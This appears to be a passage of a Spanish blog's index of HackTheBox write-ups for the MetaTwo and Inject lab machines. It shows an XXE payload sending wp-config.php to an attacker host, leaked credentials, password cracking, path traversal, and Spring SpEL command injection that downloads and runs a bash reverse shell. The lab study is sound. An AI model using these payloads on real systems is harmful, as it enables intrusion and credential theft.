'http://10.10.14.36/?p=%file;'&gt;\" &gt;WAVFootHoldWuolah vemos cosas interesantes.server {\tlisten 80;\tlisten [::]:80;\troot /var/www/metapress.htb/blog;\tindex index.php index.html;        if ($http_host != \"metapress.htb\") {                rewrite ^ http://metapress.htb/;        }\tlocation / {\t\ttry_files $uri $uri/ /index.php?$args;\t}    \tlocation ~ \\.php$ {\t\tinclude snippets/fastcgi-php.conf;\t\tfastcgi_pass unix:/var/run/php/php8.0-fpm.sock;\t}\tlocation ~* \\.(js|css|png|jpg|jpeg|gif|ico|svg)$ {\t\texpires max;\t\tlog_not_found off;\t}}Nos conectamos por SSH al usuarioSi vemos la ruta del proyecto ahí se encuentra un archivo importante wp-config.php como no podemos apuntar a el ya que el propietario es root podemos aplicar un recorrido de directorios ../wp-config.php.❯ php -S 0.0.0.0:80[Wed Mar 29 14:46:22 2023] PHP 7.4.33 Development Server (http://0.0.0.0:80) started[Wed Mar 29 14:46:32 2023] 10.10.11.186:49504 Accepted[Wed Mar 29 14:46:32 2023] 10.10.11.186:49504 [200]: (null) /exploit.dtd[Wed Mar 29 14:46:32 2023] 10.10.11.186:49504 Closing[Wed Mar 29 14:46:32 2023] 10.10.11.186:49512 Accepted[Wed Mar 29 14:46:32 2023] 10.10.11.186:49512 [404]: (null) /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== - No such file or directorySi le aplicamos un decode a esto vemos&lt;?php/** The name of the database for WordPress */define( 'DB_NAME', 'blog' );/** MySQL database username */define( 'DB_USER', 'blog' );/** MySQL database password */define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );/** MySQL hostname */define( 'DB_HOST', 'localhost' );/** Database Charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8mb4' );/** The Database Collate type. Don't change this if in doubt. */define( 'DB_COLLATE', '' );define( 'FS_METHOD', 'ftpext' );define( 'FTP_USER', 'metapress.htb' );define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );define( 'FTP_HOST', 'ftp.metapress.htb' );define( 'FTP_BASE', 'blog/' );define( 'FTP_SSL', false );/**#@+ * Authentication Unique Keys and Salts. * @since 2.6.0 */define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:' );define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );define( 'LOGGED_IN_KEY',    'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy' );define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D' );define( 'SECURE_AUTH_SALT', '&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.' );define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=' );define( 'NONCE_SALT',       '.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );/** * WordPress Database Table prefix. */$table_prefix = 'wp_';/** * For developers: WordPress debugging mode. * @link https://wordpress.org/support/article/debugging-in-wordpress/ */define( 'WP_DEBUG', false );/** Absolute path to the WordPress directory. */if ( ! defined( 'ABSPATH' ) ) {\tdefine( 'ABSPATH', __DIR__ . '/' );}/** Sets up WordPress vars and included files. */require_once ABSPATH . 'wp-settings.php';Si se acuerdan en el escaneo NMAP  vimmos el puerto 21 (FTP), podemos autenticarnos.❯ ftp 10.10.11.186Connected to 10.10.11.186.220 ProFTPD Server (Debian) [::ffff:10.10.11.186]Name (10.10.11.186:h4ckerlite): metapress.htb331 Password required for metapress.htbPassword: 9NYS_ii@FyL_p5M2NvJ230 User metapress.htb logged inRemote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir200 PORT command successful150 Opening ASCII mode data connection for file listdrwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blogdrwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer226 Transfer completeftp&gt; cd mailer250 CWD command successfulftp&gt; ls200 PORT command successful150 Opening ASCII mode data connection for file listdrwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php226 Transfer completeftp&gt; get send_email.phplocal: send_email.php remote: send_email.php200 PORT command successful150 Opening BINARY mode data connection for send_email.php (1126 bytes)226 Transfer complete1126 bytes received in 0.00 secs (911.0269 kB/s)ftp&gt; Leemos el archivo.❯ cat send_email.php&lt;?php/* * This script will be used to send an email to all our users when ready for launch*/use PHPMailer\\PHPMailer\\PHPMailer;use PHPMailer\\PHPMailer\\SMTP;use PHPMailer\\PHPMailer\\Exception;require 'PHPMailer/src/Exception.php';require 'PHPMailer/src/PHPMailer.php';require 'PHPMailer/src/SMTP.php';$mail = new PHPMailer(true);$mail-&gt;SMTPDebug = 3;                               $mail-&gt;isSMTP();            $mail-&gt;Host = \"mail.metapress.htb\";$mail-&gt;SMTPAuth = true;                          $mail-&gt;Username = \"jnelson@metapress.htb\";                 $mail-&gt;Password = \"Cb4_JmWM8zUZWMu@Ys\";                           $mail-&gt;SMTPSecure = \"tls\";                           $mail-&gt;Port = 587;                                   $mail-&gt;From = \"jnelson@metapress.htb\";$mail-&gt;FromName = \"James Nelson\";$mail-&gt;addAddress(\"info@metapress.htb\");$mail-&gt;isHTML(true);$mail-&gt;Subject = \"Startup\";$mail-&gt;Body = \"&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;\";try {    $mail-&gt;send();    echo \"Message has been sent successfully\";} catch (Exception $e) {    echo \"Mailer Error: \" . $mail-&gt;ErrorInfo;}Vemos un usuario y su contraseña, procedemos a conectarnos por SSH.❯ ssh jnelson@metapress.htbThe authenticity of host 'metapress.htb (10.10.11.186)' can't be established.ECDSA key fingerprint is SHA256:3MyoxrDpzSN/H4ZJAbl3k/OSAyorwqmMnL3UtS0pVcQ.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'metapress.htb,10.10.11.186' (ECDSA) to the list of known hosts.jnelson@metapress.htb's password: Cb4_JmWM8zUZWMu@YsLinux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Mar 29 18:40:26 2023 from 10.10.16.29jnelson@meta2:~$ export TERM=xtermProcedemos a leer la flag.jnelson@meta2:~$ cat user.txt 1f****************************2djnelson@meta2:~$ Escalada de PrivilegiosSi vemos carpetas ocultas encontramos esto.jnelson@meta2:~$ ls -latotal 52drwxr-xr-x 6 jnelson jnelson 4096 Mar 29 16:25 .drwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -&gt; /dev/null-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrcdrwx------ 2 jnelson jnelson 4096 Mar 29 14:22 .gnupg-r-xr-x--- 1 jnelson jnelson 5243 Mar 29 16:25 .keysdrwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .localdr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profiledrwx------ 2 jnelson jnelson 4096 Mar 29 16:25 .ssh-rw-r--r-- 1 jnelson jnelson    0 Mar 29 16:25 gpg.john-rw-r--r-- 1 jnelson jnelson  347 Mar 29 16:38 pass-rw-r----- 1 root    jnelson   33 Mar 29 13:39 user.txtjnelson@meta2:~$ La carpeta .passpie nos llama la atenciónjnelson@meta2:~/.passpie$ ls -latotal 24dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .drwxr-xr-x 6 jnelson jnelson 4096 Mar 29 16:25 ..-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keysdr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 sshA su vez, vemos un archivo .keysjnelson@meta2:~/.passpie$ ls  -latotal 24dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .drwxr-xr-x 6 jnelson jnelson 4096 Mar 29 16:25 ..-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keysdr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 sshjnelson@meta2:~/.passpie$ Copiamos la clave privada. En nuestra máquina ejecutamos❯ gpg2john key &gt; hashFile keyAhora lo intentamos crackear con john.❯ john -w:/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])Cost 1 (s2k-count) is 65011712 for all loaded hashesCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashesCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusblink182         (Passpie)1g 0:00:00:05 DONE (2023-03-29 15:43) 0.1934g/s 31.72p/s 31.72c/s 31.72C/s ginger..blink182Use the \"--show\" option to display all of the cracked passwords reliablySession completedCopiamos la data del archivo hash y la exportamos con passpie.jnelson@meta2:~$ lspass  user.txtjnelson@meta2:~$ passpie export pass Passphrase: jnelson@meta2:~$ Ahora leemos la información.jnelson@meta2:~$ cat passcredentials:- comment: ''  fullname: root@ssh  login: root  modified: 2022-06-26 08:58:15.621572  name: ssh  password: !!python/unicode '****************'- comment: ''  fullname: jnelson@ssh  login: jnelson  modified: 2022-06-26 08:58:15.514422  name: ssh  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'handler: passpieversion: 1.0jnelson@meta2:~$ Ahora solo queda hacer un un su rootjnelson@meta2:~$ su rootPassword: root@meta2:/home/jnelson# cat /root/root.txt49****************************a0root@meta2:/home/jnelson#"
  },
  
  {
    "title": "Encoding WriteUp",
    "url": "/posts/encoding-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "",
    "date": "2023-03-19 17:00:00 +0100",
    





    "snippet": "Proximamente…"
  },
  
  {
    "title": "Inject WriteUp",
    "url": "/posts/inject-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy, directory transversal, Ansible playbook, spring, SpEL injection, command injection",
    "date": "2023-03-11 17:00:00 +0100",
    





    "snippet": "Les explicaré cómo compremeter la máquina Inject de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo Directory Transversal, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo command injection. Para migrar de usuario nos aprovecharemos de una contraseña filtrada. Y para escalar nuestros privilegios usaremos un archivo Ansibe playbook.Identificando el OSEnviando trazas ICMP (Internet Control Message Protocol) y usando el TTL(Time to Live) podemos identificar el OS.❯ ping -c1 10.129.178.241PING 10.129.178.241 (10.129.178.241) 56(84) bytes of data.64 bytes from 10.129.178.241: icmp_seq=1 ttl=63 time=214 ms--- 10.129.178.241 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 214.029/214.029/214.029/0.000 msVemos lo siguiente:  TTL          El TTL es 63, esto indica que es una máquina Linux, ya que dichas mæquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.      Analizando la WEBWeb ErrorSi entramos veremos un mensaje de que no se puede acceder, así que sabemos que el puerto HTTP está corriendo en otro puerto, realizamos un escaneo NMAP.Escaneo NMAPRealizaremos el escaneo para saber que purtos están abierto y además para ver por donde corre el HTTP.❯ nmap 10.129.178.241Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 12:33 -04Nmap scan report for 10.129.178.241Host is up (0.23s latency).Not shown: 998 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 2.47 secondsCorre por el puerto 8080, ahora podemos ver la web correctamente.Web ErrorDetectando posibles métodos de intruciónVemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archivo y vemos un Sing Up podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos indica que esta en construcción.Enumerando DirectoriosUsando WFUZZ veremos algunos directorios importantes❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.178.241:8080/FUZZ 2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://10.129.178.241:8080/FUZZTotal requests: 220547=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000153:   200        112 L    326 W      5371 Ch     \"blogs\"                                                                                                                000000051:   200        103 L    194 W      5654 Ch     \"register\"                                                                                                             000000352:   200        53 L     107 W      1857 Ch     \"upload\"                                                                                                               000001097:   500        0 L      27 W       712 Ch      \"environment\"                                                                                                          000002694:   500        0 L      3 W        106 Ch      \"error\"                                                                                                                000008675:   200        33 L     77 W       1086 Ch     \"release_notes\"                                                                                                        000022957:   400        0 L      32 W       431 Ch      \"http%3A%2F%2Fwww\"                                                                                                     000045226:   200        165 L    487 W      6657 Ch     \"http://10.129.178.241:8080/\"                                                                                          ^CTotal time: 267.0736Processed Requests: 48259Filtered Requests: 48251Requests/sec.: 180.6954La carpera /upload nos llama la atención, ingresamos a ella y podemos ver que nos dejan subir archivosUploadSi subimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y miremos resultados.Imagenentramos a ver la imagen y …..mmmm  img?= eso huele a Directory Transversal. Podemos probar ver el /etc/passwd ingresamos la cadenaDirectory Transversal../../../../../../../../../../../../../../../../etc/passwdPero no vemos nada, podemos probar con burp o curl, interceptamos la petición y la mandamos al repeater.BurpsuiteAnalizando mas a fondo la web  podemos intentar listar la carppeta donde se guardan las paginas web /var/www/❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/'htmlWebAppla careta WebApp nos llama la atención podemos listar su contenido❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp'.classpath.DS_Store.idea.project.settingsHELP.mdmvnwmvnw.cmdpom.xmlsrctargetUn archivo .xml, lo leemos.❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp/pom.xml'&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\txsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\t&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\t&lt;parent&gt;\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\t\t&lt;version&gt;2.6.5&lt;/version&gt;\t\t&lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\t&lt;/parent&gt;\t&lt;groupId&gt;com.example&lt;/groupId&gt;\t&lt;artifactId&gt;WebApp&lt;/artifactId&gt;\t&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\t&lt;name&gt;WebApp&lt;/name&gt;\t&lt;description&gt;Demo project for Spring Boot&lt;/description&gt;\t&lt;properties&gt;\t\t&lt;java.version&gt;11&lt;/java.version&gt;\t&lt;/properties&gt;\t&lt;dependencies&gt;\t\t&lt;dependency&gt;  \t\t\t&lt;groupId&gt;com.sun.activation&lt;/groupId&gt;  \t\t\t&lt;artifactId&gt;javax.activation&lt;/artifactId&gt;  \t\t\t&lt;version&gt;1.2.0&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;\t\t\t&lt;scope&gt;runtime&lt;/scope&gt;\t\t\t&lt;optional&gt;true&lt;/optional&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;\t\t\t&lt;version&gt;3.2.2&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\t\t\t&lt;scope&gt;test&lt;/scope&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.webjars&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;bootstrap&lt;/artifactId&gt;\t\t\t&lt;version&gt;5.1.3&lt;/version&gt;\t\t&lt;/dependency&gt;\t\t&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.webjars&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;\t\t&lt;/dependency&gt;\t&lt;/dependencies&gt;\t&lt;build&gt;\t\t&lt;plugins&gt;\t\t\t&lt;plugin&gt;\t\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\t\t\t\t&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\t\t\t\t&lt;version&gt;${parent.version}&lt;/version&gt;\t\t\t&lt;/plugin&gt;\t\t&lt;/plugin&gt;\t\t&lt;finalName&gt;spring-webapp&lt;/finalName&gt;\t&lt;/build&gt;&lt;/project&gt;Viendo algunas versiones nos encontranos con Spring Cloud Function Web, buscando CVE nos encontramos que es vulnerable a SpEL injection.ExplotaciónExplotación manualSi buscamos CVE relacionadas vemos este articulo  y este repo de github le pasamos mediante una petición curl y con un argumento de java intentamos ejecutar código remoto.❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/pwned\")' --data-raw 'data' -vNote: Unnecessary use of -X or --request, POST is already inferred.*   Trying 10.10.11.204:8080...* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)&gt; POST /functionRouter HTTP/1.1&gt; Host: 10.10.11.204:8080&gt; User-Agent: curl/7.88.1&gt; Accept: */*&gt; spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/pwned\")&gt; Content-Length: 4&gt; Content-Type: application/x-www-form-urlencoded&gt; &lt; HTTP/1.1 500 &lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Date: Tue, 04 Apr 2023 19:13:59 GMT&lt; Connection: close&lt; * Closing connection 0{\"timestamp\":\"2023-04-04T19:13:59.853+00:00\",\"status\":500,\"error\":\"Internal Server Error\",\"message\":\"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to javaSi comprobamos , notamos que se creo el archvo.❯ curl 'http://10.10.11.204:8080/show_image?img=.././../../../../../././../../../../../tmp'.font-unix.ICE-unix.Test-unix.X11-unix.XIM-unixhsperfdata_frankpwnedsKlBssystemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-ModemManager.service-KPpmahsystemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-systemd-logind.service-akTAChsystemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-systemd-resolved.service-Dxelehsystemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-systemd-timesyncd.service-6fJWPgtomcat.8080.13169043535093016834tomcat-docbase.8080.5822812062628089578vmware-root_741-4248811580YbRuN.b64Creamos una reverse shell.❯ cat pwned.sh#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.83/443 0&gt;&amp;1Nos creamos un servidor python❯ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...En otra terminal nos ponemos en escucha.❯ nc -lvnp 443listening on [any] 443 ...Subismos el archivo❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"wget http://10.10.14.83/pwned.sh -o /tmp/pwned.sh\")' --data-raw 'data' -vNote: Unnecessary use of -X or --request, POST is already inferred.*   Trying 10.10.11.204:8080...* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)&gt; POST /functionRouter HTTP/1.1&gt; Host: 10.10.11.204:8080&gt; User-Agent: curl/7.88.1&gt; Accept: */*&gt; spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://10.10.14.83/pwned.sh -o /tmp/pwned.sh\")&gt; Content-Length: 4&gt; Content-Type: application/x-www-form-urlencoded&gt; &lt; HTTP/1.1 500 &lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Date: Tue, 04 Apr 2023 19:24:40 GMT&lt; Connection: close&lt; * Closing connection 0{\"timestamp\":\"2023-04-04T19:24:40.750+00:00\",\"status\":500,\"error\":\"Internal Server Error\",\"message\":\"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String\",\"path\":\"/functionRouter\"}#   Le damos permiso❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"chmod +x /tmp/pwned.sh\")' --data-raw 'data' -vNote: Unnecessary use of -X or --request, POST is already inferred.*   Trying 10.10.11.204:8080...* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)&gt; POST /functionRouter HTTP/1.1&gt; Host: 10.10.11.204:8080&gt; User-Agent: curl/7.88.1&gt; Accept: */*&gt; spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"chmod +x /tmp/pwned.sh\")&gt; Content-Length: 4&gt; Content-Type: application/x-www-form-urlencoded&gt; &lt; HTTP/1.1 500 &lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Date: Tue, 04 Apr 2023 19:26:55 GMT&lt; Connection: close&lt; * Closing connection 0{\"timestamp\":\"2023-04-04T19:26:55.630+00:00\",\"status\":500,\"error\":\"Internal Server Error\",\"message\":\"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String\",\"path\":\"/functionRouter\"}#                                                                                                                                                Lo ejecutamos❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/pwned.sh\")' --data-raw 'data' -vNote: Unnecessary use of -X or --request, POST is already inferred.*   Trying 10.10.11.204:8080...* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)&gt; POST /functionRouter HTTP/1.1&gt; Host: 10.10.11.204:8080&gt; User-Agent: curl/7.88.1&gt; Accept: */*&gt; spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/pwned.sh\")&gt; Content-Length: 4&gt; Content-Type: application/x-www-form-urlencoded&gt; &lt; HTTP/1.1 500 &lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Date: Tue, 04 Apr 2023 19:33:45 GMT&lt; Connection: close&lt; * Closing connection 